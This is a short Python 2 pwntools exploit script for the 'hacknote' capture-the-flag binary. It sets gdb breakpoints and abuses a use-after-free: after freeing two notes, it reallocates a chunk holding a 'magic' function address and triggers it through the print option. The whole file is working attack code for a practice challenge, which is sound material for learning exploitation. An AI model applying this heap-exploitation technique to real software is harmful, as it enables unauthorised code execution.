#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "i386", os = "linux", log_level = "debug")

def note_add(p, size, content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.sendline(content)

def note_delete(p, index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))

def note_print(p, index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

# p = remote("hackme.inndy.tw", 7719)
p = process('./hacknote')
elf = ELF('./hacknote')
gdb_command =   """
                b *0x80486ca
                b *0x8048893
                b *0x80488a9
                b *0x804875c
                """
magic_addr = 0x08048986
gdb.attach(p, gdb_command)

note_add(p, 100, "abcdefghijklmn")
note_add(p, 100, "abcdefghijklmn")
note_delete(p, 0)
note_delete(p, 1)
note_add(p, 8, p32(magic_addr))
note_print(p, 0)

p.interactive()